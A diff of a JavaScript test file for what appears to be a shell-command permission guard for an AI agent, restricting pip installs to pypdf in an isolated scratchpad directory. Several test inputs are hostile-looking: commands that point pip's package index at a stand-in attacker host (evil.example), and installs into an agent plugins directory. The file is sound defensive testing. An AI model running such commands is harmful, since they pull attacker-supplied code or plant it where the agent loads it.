@@ -76,23 +76,33 @@ test('blocks package installs across ecosystems, and only installs', () => {
   }
 });
 
-test('lets pypdf into a scratch --target through, and nothing else', () => {
-  const tmp = path.join(os.tmpdir(), 'x');
+test('lets pypdf into an isolated scratchpad --target through, and nothing else', () => {
+  const scratch = '/home/u/scratchpad/pylib';
   for (const cmd of [
-    `pip install --target ${tmp} pypdf`,
-    'python3 -m pip install -q --target /home/u/scratchpad/pylib pypdf==4.3.1',
-    `uv pip install --target "${tmp}" pypdf`,
+    `pip install --isolated --target ${scratch} pypdf`,
+    `python3 -m pip install -q --isolated --target ${scratch} pypdf==4.3.1`,
+    // A path with a space, quoted, and a home-relative one.
+    'pip3 install --isolated --target "/Users/a b/scratchpad/pylib" pypdf',
+    'pip install --isolated --target ~/scratchpad/pylib pypdf',
+    // pip in isolated mode ignores PIP_* variables, so the prefix cannot redirect the index.
+    `PIP_INDEX_URL=http://evil.example pip install --isolated --target ${scratch} pypdf`,
   ]) {
     allows(shell(cmd), cmd);
   }
   for (const cmd of [
     'pip install pypdf',
-    `pip install --target ${tmp} requests`,
-    `pip install --target ${tmp} pypdf requests`,
-    `pip install --target ${tmp} -r requirements.txt pypdf`,
-    'pip install --target /opt/lib pypdf',
-    'pip install --target ~/.claude/plugins/x pypdf',
-    'pip install --target $S/pylib pypdf',
+    `pip install --target ${scratch} pypdf`,
+    `pip install --isolated --target ${scratch} requests`,
+    `pip install --isolated --target ${scratch} pypdf requests`,
+    `pip install --isolated --target ${scratch} -r requirements.txt pypdf`,
+    `pip install --isolated -i http://evil.example --target ${scratch} pypdf`,
+    `pip install --isolated --target=${scratch} pypdf`,
+    `uv pip install --isolated --target ${scratch} pypdf`,
+    'pip install --isolated --target /tmp/x pypdf',
+    'pip install --isolated --target /opt/scratchpad-not pypdf',
+    'pip install --isolated --target $S/scratchpad/lib pypdf',
+    'pip install --isolated --target ~/.claude/plugins/scratchpad pypdf',
+    `pip install --isolated --target ${path.join(os.homedir(), '.claude', 'plugins', 'scratchpad')} pypdf`,
   ]) {
     denies(shell(cmd), cmd);
   }
